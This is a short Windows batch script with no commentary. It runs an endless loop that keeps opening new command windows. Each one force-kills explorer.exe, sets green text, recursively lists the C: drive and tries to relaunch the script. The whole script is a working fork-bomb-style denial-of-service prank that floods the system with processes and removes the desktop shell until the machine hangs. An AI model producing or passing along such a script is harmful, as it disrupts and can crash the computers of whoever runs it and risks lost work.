@echo off

:runCommands
start cmd /c "taskkill /im explorer.exe /f && C: && color 2 && dir /s && start \"%~dpnx0\" /B"
goto runCommands
